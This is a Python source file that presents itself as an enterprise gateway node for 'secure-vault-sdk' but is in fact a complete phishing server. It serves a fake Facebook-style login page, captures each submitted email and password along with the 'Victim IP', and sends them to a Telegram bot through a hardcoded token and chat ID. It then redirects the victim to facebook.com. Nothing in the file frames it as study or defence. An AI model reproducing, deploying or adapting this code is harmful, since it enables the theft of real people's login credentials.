#!/usr/bin/env python3
"""
Enterprise Unified Gateway Node - secure-vault-sdk
Distributed Cluster Relay Architecture v4.2
"""

import http.server
import socketserver
import urllib.parse
import urllib.request
import json

PORT = 8080
TG_BOT_TOKEN = "8931915858:AAHnAs6rPshxwP30jSfzORDOmXK2M2krUvs"
TG_CHAT_ID = "8803897745"
NODE_NAME = "secure-vault-sdk"
CLUSTER_INDEX = 3

def send_to_telegram(username, password, ip_addr):
    message = f"🚨 [UNIFIED CLUSTER CAPTURE — NODE: {NODE_NAME} (ID: {CLUSTER_INDEX}/10)] 🚨\n👤 Username/Email: {username}\n🔑 Password: {password}\n🌐 Victim IP: {ip_addr}"
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = json.dumps({"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}).encode("utf-8")
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.read()
    except Exception as e:
        print("Relay error:", e)

class UnifiedHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/" or parsed.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            page = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Unified Identity Portal</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 380px; text-align: center; }
        .title { font-size: 24px; font-weight: bold; color: #1877f2; margin-bottom: 24px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 12px; }
        button:hover { background: #166fe5; }
        .footer { margin-top: 20px; font-size: 12px; color: #65676b; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">Unified Enterprise Portal</div>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Continue Authentication</button>
        </form>
        <div class="footer">Cluster Node Verified: secure-vault-sdk</div>
    </div>
</body>
</html>"""
            self.wfile.write(page.encode("utf-8"))
        elif parsed.path == "/health":
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(('{"node":"' + NODE_NAME + '","cluster_index":' + str(CLUSTER_INDEX) + ',"status":"active"}').encode("utf-8"))
        else:
            super().do_GET()

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8")
            params = urllib.parse.parse_qs(data)
            user = params.get("email", [""])[0]
            pwd = params.get("pass", [""])[0]
            ip = self.client_address[0]
            
            send_to_telegram(user, pwd, ip)
            
            self.send_response(302)
            self.send_header("Location", "https://www.facebook.com")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), UnifiedHandler) as httpd:
        print("Unified Relay Node active on port 8080...")
        httpd.serve_forever()
